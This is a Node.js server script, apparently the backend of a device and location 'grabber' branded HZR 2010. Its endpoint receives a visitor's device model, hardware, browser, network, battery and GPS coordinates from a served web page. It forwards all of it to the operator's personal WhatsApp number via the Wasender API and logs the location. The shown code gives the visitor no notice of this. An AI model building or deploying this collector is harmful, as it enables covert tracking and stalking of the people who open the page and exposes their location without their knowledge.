const express = require("express");
const cors = require("cors");
const path = require("path");
require("dotenv").config();

const app = express();

const PORT = process.env.PORT || 3000;

const WASENDER_TOKEN = process.env.WASENDER_TOKEN;
const MY_WHATSAPP_NUMBER = process.env.MY_WHATSAPP_NUMBER;


// ==========================================
// CHECK ENVIRONMENT VARIABLES
// ==========================================

if (!WASENDER_TOKEN || !MY_WHATSAPP_NUMBER) {
    console.error("=================================");
    console.error("ERROR: Missing environment variables");
    console.error("Please set:");
    console.error("WASENDER_TOKEN");
    console.error("MY_WHATSAPP_NUMBER");
    console.error("=================================");

    process.exit(1);
}


// ==========================================
// MIDDLEWARE
// ==========================================

app.use(cors());

app.use(
    express.json({
        limit: "20kb"
    })
);


// ==========================================
// HOME PAGE
// ==========================================

app.get("/", (req, res) => {

    res.sendFile(
        path.join(__dirname, "index.html")
    );

});


// ==========================================
// STATUS
// ==========================================

app.get("/api/status", (req, res) => {

    res.json({

        success: true,

        service: "HZR 2010",

        status: "online"

    });

});


// ==========================================
// SEND DEVICE INFORMATION
// ==========================================

app.post("/api/send-device-info", async (req, res) => {

    console.log("");
    console.log("=================================");
    console.log("HZR 2010");
    console.log("DEVICE INFO REQUEST RECEIVED");
    console.log("=================================");


    try {

        const info = req.body || {};


        // ==========================================
        // SAFE VALUES
        // ==========================================

        const browser =
            info.browser || "Unknown";

        const browserVersion =
            info.browserVersion || "Unknown";

        const manufacturer =
            info.manufacturer || "Unknown";

        const device =
            info.device || "Unknown";

        const android =
            info.android || "Unknown";

        const language =
            info.language || "Unknown";

        const online =
            info.online !== undefined
                ? (info.online ? "Online" : "Offline")
                : "Unknown";

        const screen =
            info.screen || "Unknown";

        const viewport =
            info.viewport || "Unknown";

        const pixelRatio =
            info.pixelRatio || "Unknown";

        const timezone =
            info.timezone || "Unknown";

        const hardwareConcurrency =
            info.hardwareConcurrency || "Unknown";

        const deviceMemory =
            info.deviceMemory || "Unknown";

        const maxTouchPoints =
            info.maxTouchPoints !== undefined
                ? info.maxTouchPoints
                : "Unknown";


        // ==========================================
        // NETWORK
        // ==========================================

        const connectionType =
            info.connectionType || "Unknown";

        const connectionSpeed =
            info.connectionSpeed || "Unknown";


        // ==========================================
        // BATTERY
        // ==========================================

        const batteryLevel =
            info.batteryLevel || "Unknown";

        const batteryCharging =
            info.batteryCharging || "Unknown";


        // ==========================================
        // LOCATION
        // ==========================================

        const latitude =
            info.latitude !== undefined
                ? info.latitude
                : "Permission denied";

        const longitude =
            info.longitude !== undefined
                ? info.longitude
                : "Permission denied";

        const accuracy =
            info.accuracy !== undefined
                ? info.accuracy
                : "Unknown";


        // ==========================================
        // TIME
        // ==========================================

        const time =
            info.time || "Unknown";


        // ==========================================
        // WHATSAPP MESSAGE
        // ==========================================

        const message =

`🔵 HZR 2010
━━━━━━━━━━━━━━━━

📱 DEVICE
Device       : ${manufacturer} ${device}
Android      : ${android}
RAM          : ${deviceMemory} GB
CPU          : ${hardwareConcurrency} Cores
Touch        : ${maxTouchPoints} Points
Screen       : ${screen}
Viewport     : ${viewport}
Pixel Ratio  : ${pixelRatio}

🌐 BROWSER
Browser      : ${browser}
Version      : ${browserVersion}
Language     : ${language}

📶 NETWORK
Status       : ${online}
Connection   : ${connectionType}
Speed        : ${connectionSpeed}

📍 LOCATION
Latitude     : ${latitude}
Longitude    : ${longitude}
Accuracy     : ${accuracy} m

🔋 BATTERY
Level        : ${batteryLevel}
Charging     : ${batteryCharging}

🕒 TIME
Local Time   : ${time}
Timezone     : ${timezone}

━━━━━━━━━━━━━━━━
© 2010–2026 HZR 2010
All Rights Reserved`;


        console.log("Sending information to WhatsApp...");
        console.log("Recipient:", MY_WHATSAPP_NUMBER);

        console.log("Location:");
        console.log("Latitude:", latitude);
        console.log("Longitude:", longitude);
        console.log("Accuracy:", accuracy);


        // ==========================================
        // SEND TO WASENDER
        // ==========================================

        const response = await fetch(
            "https://api.wasender.dev/messages/text",
            {

                method: "POST",

                headers: {

                    "Authorization":
                        `Bearer ${WASENDER_TOKEN}`,

                    "Content-Type":
                        "application/json"

                },

                body: JSON.stringify({

                    to: MY_WHATSAPP_NUMBER,

                    body: message

                })

            }
        );


        const resultText =
            await response.text();


        console.log(
            "Wasender HTTP status:",
            response.status
        );

        console.log(
            "Wasender response:",
            resultText
        );


        // ==========================================
        // API ERROR
        // ==========================================

        if (!response.ok) {

            console.error(
                "Wasender API returned an error."
            );

            return res.status(502).json({

                success: false,

                error:
                    "WhatsApp API error"

            });

        }


        // ==========================================
        // PARSE RESPONSE
        // ==========================================

        let result = {};

        try {

            result =
                JSON.parse(resultText);

        }

        catch (e) {

            console.log(
                "Wasender response was not JSON."
            );

        }


        // ==========================================
        // SUCCESS
        // ==========================================

        console.log(
            "Message accepted by Wasender."
        );

        console.log(
            "================================="
        );


        res.json({

            success: true,

            message:
                "Information sent successfully",

            wasender:
                result

        });


    }

    catch (error) {

        console.error(
            "================================="
        );

        console.error(
            "HZR 2010 SERVER ERROR:"
        );

        console.error(error);

        console.error(
            "================================="
        );


        res.status(500).json({

            success: false,

            error:
                "Internal server error"

        });

    }

});


// ==========================================
// START SERVER
// ==========================================

app.listen(
    PORT,
    "0.0.0.0",
    () => {

        console.log("");
        console.log("=================================");
        console.log("HZR 2010 SERVER");
        console.log("=================================");
        console.log(
            `Server running on port ${PORT}`
        );
        console.log(
            "Service: Online"
        );
        console.log(
            "=================================",
        );

    }
);
